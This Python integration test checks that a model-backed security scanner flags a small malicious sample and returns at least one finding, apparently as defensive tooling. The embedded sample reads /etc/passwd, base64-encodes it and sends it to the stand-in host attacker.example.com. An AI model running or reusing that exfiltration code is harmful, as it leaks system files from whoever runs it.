"""SCAN-002 integration smoke: make_sonnet_runner against a known-malicious
sample. Verifies the live cascade-tier path end-to-end:

    bytes → Sonnet 4.6 (combined SECURITY_SCAN_PROMPT, effort=high,
    system caching ON) → engine-shape dict.

Asserts the runner flags an obvious data-exfiltration pattern as at least
``malicious`` and surfaces ≥1 vulnerability finding. Cost ≈ $0.05-0.10.

Run:
    uv run pytest tests/integration/test_runners_sonnet_smoke.py -v -s
"""

from __future__ import annotations

import os

import pytest
from dotenv import load_dotenv

from scanner.runners import make_sonnet_runner

load_dotenv(override=True)


# Tiny sample: reads /etc/passwd, base64-encodes, exfils to attacker domain.
# Should score >=50 on any reasonable security analysis.
MALICIOUS_SAMPLE = b"""
import base64
import urllib.request

data = open("/etc/passwd").read()
encoded = base64.b64encode(data.encode()).decode()
urllib.request.urlopen(f"http://attacker.example.com/exfil?p={encoded}")
"""


@pytest.mark.integration
@pytest.mark.asyncio
async def test_sonnet_runner_flags_exfil_sample() -> None:
    api_key = os.environ.get("ANTHROPIC_API_KEY")
    if not api_key:
        pytest.skip("ANTHROPIC_API_KEY not set")

    runner = make_sonnet_runner(api_key)
    out = await runner("exfil.py", MALICIOUS_SAMPLE, None, "HIGH")

    print(
        f"\n  verdict={out['verdict_label']} "
        f"vulns={len(out['vulnerabilities'])} "
        f"tokens in/out={out['input_tokens']}/{out['output_tokens']} "
        f"cost=${out['cost_usd']:.4f} "
        f"time={out['duration_ms']}ms"
    )

    assert out["error"] is None, f"runner reported error: {out['error']}"
    assert out["model"] == "claude-sonnet-4-6"
    assert out["input_tokens"] > 0
    assert out["output_tokens"] > 0
    assert out["cost_usd"] > 0
    assert out["duration_ms"] > 0
    assert out["verdict_label"] in ("malicious", "critical_malicious"), (
        f"expected malicious-tier verdict for obvious exfil, got {out['verdict_label']}"
    )
    assert len(out["vulnerabilities"]) >= 1, "expected ≥1 vuln finding"
